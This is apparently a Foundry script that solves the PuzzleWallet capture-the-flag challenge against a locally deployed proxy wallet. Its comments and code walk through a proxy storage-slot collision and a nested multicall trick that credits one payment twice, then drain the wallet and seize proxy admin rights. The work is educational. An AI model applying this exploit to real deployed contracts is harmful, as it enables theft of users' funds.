// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
// import "forge-std/console.sol";
import "forge-std/console2.sol";
import {PuzzleWallet, PuzzleProxy} from "../src/PuzzleWallet.sol";

contract PuzzleWalletSolution is Script {
    // $ forge script script/PuzzleWallet.s.sol --tc PuzzleWalletSolution -vvvv

    PuzzleProxy proxy;
    PuzzleWallet puzzleWallet;

    function run() external {
        // --- Setting Up the Deployed wallet instance ---

        address admin = makeAddr("admin");
        vm.deal(admin, 1 ether);
        vm.startPrank(admin);

        puzzleWallet = new PuzzleWallet();

        // deploy proxy and initialize implementation contract
        bytes memory initData = abi.encodeWithSelector(PuzzleWallet.init.selector, 100 ether);

        proxy = new PuzzleProxy(admin, address(puzzleWallet), initData);

        // Since our wallet is managed by the proxy, any call from the proxy contract that its function
        // is not existed in the contract will make delegateCall
        // We will have two interfaces for the same address: Proxy instance and wallet instance)
        PuzzleWallet walletInstance = PuzzleWallet(address(proxy));
        PuzzleProxy proxyInstance = proxy;

        walletInstance.addToWhitelist(admin);
        walletInstance.deposit{value: 0.1 ether}();

        // This is how the wallet is setting up in the challenge
        // - The Wallet has an 0.1 ether

        // --- Attack Starts From Here ---

        // - The admin variable lies in the 2nd storage slot (slot number 1), and the 2nd storage slot variable in the `PuzzleWallet` contract is `maxBalance`.
        // - So we need to change the `maxBalance` variable to change the admin.
        // - We can change `maxBalance` by firing `PuzzleWallet::setMaxBalance()`, account balance should be zero to pass the check in the function.
        // - To be able to execute functions in the wallet, we need to be from the Whitelisted addresses.
        // - The only one who can add addresses to WhiteListed is the wallet owner.
        // - The owner lies in the first storage slot (0slot), so it corresponds to the pendingAdmin variable in the `Proxy` contract.
        // - We can easily be the `pendingAdmin` of the contract by calling `Proxy::proposeNewAdmin`.
        // - By doing this, we will be the owner of the wallet. Remember the wallet storage lies in the proxy contract.
        // - Then we can try to do the second step (removing all the wallet balances, to be able to change the `maxBalance` variable).
        // - The wallet starts with 0.1 ether, but how can we take all the wallet balances, how to take this 0.1 ether and this balance is not our balance? (There is a check).
        // - The way to do this is using `multicall` function.
        // - `multicall()` function implements a check to prevent reusing the same `msg.value` value in two TXs.
        // - But we can implement something tricked to pass this check
        // - We will make the data (function to be executed as follows):
        //     - deposit() function in the first
        //     - multicall() => deposit()
        //
        // - So instead of making the deposit() with 0.1 ether two times, we will make deposit(), then multicall() => deposit()
        // - By doing this we will deposit 0.1 ether, our balance will be updated two times i.e. 0.2 ether, and our wallet balance will be 0.2 ether.
        // - We can withdraw all wallet balances using `execute()`.
        // - After stealing wallet funds, and resetting it to zero, we can become the admin of the Proxy contract.
        // - We can call `PuzzleWallet::setMaxBalance()`, and change the maximum balance, which will change the admin slot.
        // - We will path the challenge, and we will change the owner to the value we need.

        console.log("admin:", proxyInstance.admin());
        console.log("--- --- --- ---");
        console.log("--- Attacking ---");

        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // This will make the attacker the pendingAdmin
        // since `pendingAdmin` is in the same slot of `owner`, we will be the owner of the contract
        proxyInstance.proposeNewAdmin(attacker);
        require(walletInstance.owner() == attacker, "Failed to be the owner of the wallet");

        // Then we need to add ourselves to be Whitelisted, to execute some transactions
        walletInstance.addToWhitelist(attacker);

        bytes[] memory depositeEncoded = new bytes[](1);
        depositeEncoded[0] = abi.encodeWithSelector(walletInstance.deposit.selector);
        bytes[] memory data = new bytes[](2);
        // deposit()
        data[0] = depositeEncoded[0];
        // multicall => deposit()
        data[1] = abi.encodeWithSelector(walletInstance.multicall.selector, depositeEncoded);

        // Depositing 0.2 ether by only paying 0.1 ether
        walletInstance.multicall{value: 0.1 ether}(data);

        // Attacker balance is 0.2 ether && wallet balance is 0.2 ether too
        // We can take all wallet balance
        walletInstance.execute(admin, 0.2 ether, new bytes(0));

        // We can change the admin by calling setMaxBalance(newAdminaddress)
        walletInstance.setMaxBalance(uint256(uint160(attacker)));

        require(proxyInstance.admin() == attacker);
        console.log("We became the admin. Attack Completed");
        console.log("admin:", proxyInstance.admin());
    }

    function _lowLevelCall(address target, bytes memory selector, string memory errorMesage)
        internal
        returns (bytes memory)
    {
        (bool success, bytes memory data) = target.call(selector);
        require(success, errorMesage);
        return data;
    }
}
